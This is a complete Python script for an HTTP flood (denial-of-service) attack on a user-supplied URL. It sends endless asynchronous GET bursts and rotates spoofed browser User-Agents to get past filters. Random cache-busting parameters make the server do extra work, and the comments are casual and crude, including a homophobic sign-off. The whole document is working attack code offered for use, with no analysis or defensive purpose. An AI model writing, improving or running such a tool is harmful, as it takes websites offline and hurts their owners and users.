import asyncio
import aiohttp
import random
import time

# List of real-looking User Agents to dodge the basic filters
UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
]

async def send_request(session, target):
    header = {'User-Agent': random.choice(UAs)}
    try:
        # We use a random 'cache-buster' param to force the server to work
        # instead of serving a cached (saved) version of the page.
        url = f"{target}?q={random.randint(1, 999999)}"
        async with session.get(url, headers=header, timeout=5) as response:
            status = response.status
            # Keep it silent unless you want to see the smoke
            # print(f"[*] Hit delivered: {status}") 
    except:
        pass

async def attack(target, intensity):
    async with aiohttp.ClientSession() as session:
        tasks = []
        print(f"||PAUSE|| Lighting the stove on: {target}")
        while True:
            for _ in range(intensity):
                tasks.append(asyncio.create_task(send_request(session, target)))
            
            # This executes the whole batch at once
            await asyncio.gather(*tasks)
            tasks.clear()
            # Minimal sleep to keep the phone from melting
            await asyncio.sleep(0.01)

if __name__ == "__main__":
    target_url = input("Target URL (http://...): ")
    # How many hits per burst? 100-500 for a phone.
    power = int(input("Intensity (Try 200): ")) 
    try:
        asyncio.run(attack(target_url, power))
    except KeyboardInterrupt:
        print("\n||PAUSE|| Stove off. No homo.")
